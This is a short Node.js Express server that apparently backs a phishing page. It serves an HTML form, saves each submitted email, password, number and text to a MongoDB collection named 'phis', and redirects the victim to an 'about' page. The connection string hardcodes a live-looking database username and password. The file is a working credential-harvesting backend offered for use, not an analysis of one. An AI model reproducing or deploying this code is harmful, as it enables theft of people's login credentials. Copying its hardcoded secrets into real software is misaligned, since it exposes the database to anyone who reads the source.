const express = require('express');
const app = express();
const path = require('path');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const PORT = process.env.PORT || 5000;

mongoose.connect('mongodb+srv://admin:sedjik9867@cluster0.ak1ps.mongodb.net/phis', { useNewUrlParser: true }, { useUnifiedTopology: true })
const phisSchema = {
    number: Number,
    email: String,
    password: String,
    text: String,

}
const Phis = mongoose.model('Phis', phisSchema);
app.use(bodyParser.urlencoded({ extended: true }));

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, '/index.html'));
})
app.get("/about", (req, res) => {
    res.sendFile(path.join(__dirname, '/about.html'));
})
app.post('/', (req, res) => {
    let newPhis = new Phis({
        number: req.body.num,
        email: req.body.email,
        password: req.body.pass,
        text: req.body.text
    })
    newPhis.save();
    res.redirect('/about');
})
app.listen(PORT, () => {
    console.log('Server running successfully')
})